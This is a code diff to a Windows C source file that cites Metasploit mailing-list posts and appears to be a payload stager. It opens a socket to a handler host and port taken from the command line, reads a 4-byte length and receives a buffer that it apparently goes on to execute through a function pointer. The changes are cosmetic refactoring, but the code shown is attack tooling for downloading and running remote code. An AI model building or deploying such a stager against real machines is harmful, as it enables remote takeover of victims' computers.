@@ -9,10 +9,8 @@
  * * http://mail.metasploit.com/pipermail/framework/2012-September/008660.html
  * * http://mail.metasploit.com/pipermail/framework/2012-September/008664.html
  */
-
 #include <stdio.h>
 #include <stdlib.h>
-
 #include <winsock2.h>
 #include <windows.h> //include windows.h _AFTER_ winsock2.h to avoid redefinition issues in VS
 
@@ -37,12 +35,11 @@ void punt(SOCKET my_socket, char * error) {
 	WSACleanup();
 	exit(1);
 }
-
-/* attempt to receive all of the requested data from the socket */
-int recv_all(SOCKET my_socket, void * buffer, int len) {
+/*attempt to receive all of the requested data from the socket*/
+int recv_all(SOCKET my_socket, char * buffer, int len) {
 	int    tret   = 0;
 	int    nret   = 0;
-	void * startb = buffer;
+	char * startb = buffer;
 	while (tret < len) {
 		nret = recv(my_socket, (char *)startb, len - tret, 0);
 		startb += nret;
@@ -88,6 +85,8 @@ int main(int argc, char * argv[]) {
 	ULONG32 size;
 	char * buffer;
 	void (*function)();
+	SOCKET my_socket;
+	int count = 0;
 
 	winsock_init();
 
@@ -97,10 +96,11 @@ int main(int argc, char * argv[]) {
 	}
 
 	/* connect to the handler */
-	SOCKET my_socket = wsconnect(argv[1], atoi(argv[2]));
+	my_socket = wsconnect(argv[1], atoi(argv[2]));
 
 	/* read the 4-byte length */
-	int count = recv(my_socket, (char *)&size, 4, 0);
+
+	count = recv(my_socket, (char *)&size, 4, 0);
 	if (count != 4 || size <= 0)
 		punt(my_socket, "read a strange or incomplete length value\n");
 
